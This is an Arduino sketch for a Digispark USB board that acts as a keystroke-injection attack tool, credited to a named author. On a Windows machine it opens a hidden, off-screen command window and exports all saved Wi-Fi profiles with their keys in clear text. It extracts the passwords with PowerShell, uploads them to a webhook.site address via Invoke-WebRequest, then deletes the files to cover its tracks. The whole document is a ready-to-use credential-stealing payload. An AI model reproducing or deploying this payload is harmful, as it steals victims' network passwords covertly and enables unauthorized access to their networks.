// Author - bittu sharma



#include "DigiKeyboard.h"
#define KEY_DOWN 0x51 
#define KEY_ENTER 0x28 


void setup() {
  pinMode(1, OUTPUT); 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);   
  DigiKeyboard.sendKeyStroke(KEY_M);
  for(int i =0; i < 100; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_DOWN);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp%"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("netsh wlan export profile key=clear"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); 
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<webhook-url>   -Method POST -InFile Wi-Fi-PASS"); 
  DigiKeyboard.delay(1000);
  DigiKeyboard.println("del Wi-* /s /f /q"); 
  DigiKeyboard.delay(100);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);
  
  digitalWrite(1, HIGH); 
  DigiKeyboard.delay(9000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(500);
  
}
